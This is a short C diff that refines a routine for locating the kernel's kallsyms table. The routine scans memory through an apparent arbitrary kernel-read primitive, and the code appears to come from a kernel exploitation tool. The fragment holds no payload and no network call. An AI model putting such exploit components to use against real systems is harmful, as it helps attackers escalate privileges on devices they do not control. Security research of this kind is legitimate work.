@@ -751,6 +751,13 @@ unsigned long countIncreasingEntries(unsigned long start) {
     } while(1);
 }
 
+int increasing(unsigned long* location, unsigned n) {
+    for (int i=0; i<n-1; i++)
+        if (location[i] > location[i+1])
+            return 0;
+    return 1;
+}
+
 int find_kallsyms_addresses(unsigned long searchStart, unsigned long searchEnd, unsigned long* startP, unsigned long* countP) {
     if (searchStart == 0)
         searchStart = KERNEL_BASE;
@@ -762,8 +769,8 @@ int find_kallsyms_addresses(unsigned long searchStart, unsigned long searchEnd, 
     for (unsigned long i=searchStart; i<searchEnd ; i+=PAGE) {
         kernel_read(i, page, PAGE);
         for (int j=0; j<PAGE; j+=0x100) {
-           if (*(unsigned long*)(page+j)==KERNEL_BASE) {
-               unsigned long count = countIncreasingEntries(i+j);
+           if (isKernelPointer(*(unsigned long*)(page+j)) && increasing((unsigned long*)(page+j), 256/8-1)) {
+                unsigned long count = countIncreasingEntries(i+j);
                 if (count > 50000) {
                    *startP = i+j;
                    *countP = count;
